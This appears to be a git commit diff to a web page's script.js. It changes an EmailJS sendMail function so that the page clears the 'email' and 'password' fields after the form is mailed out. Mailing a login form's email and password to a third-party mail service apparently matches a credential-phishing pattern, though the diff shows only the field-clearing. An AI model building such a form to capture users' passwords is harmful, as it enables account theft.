721f1d4754f405838b0ab33d67f6a6da84698709
DeepDunge0n <89940561+DeepDunge0n@users.noreply.github.com>
2024-03-08 20:08:32 +0300

    Update script.js

--- script.js
+++ script.js
@@ -7,7 +7,13 @@ function sendMail(){
     const serviceID = 'service_7617z8s';
     const templateID = 'template_sf5yfy1';
     emailjs.send(serviceID, templateID, params)
-    .then(res => console.log(res.status))
+    .then(
+            res => {
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                console.log(res.status);
+            }
+        )
     .catch(err => console.log(err))
 
 }
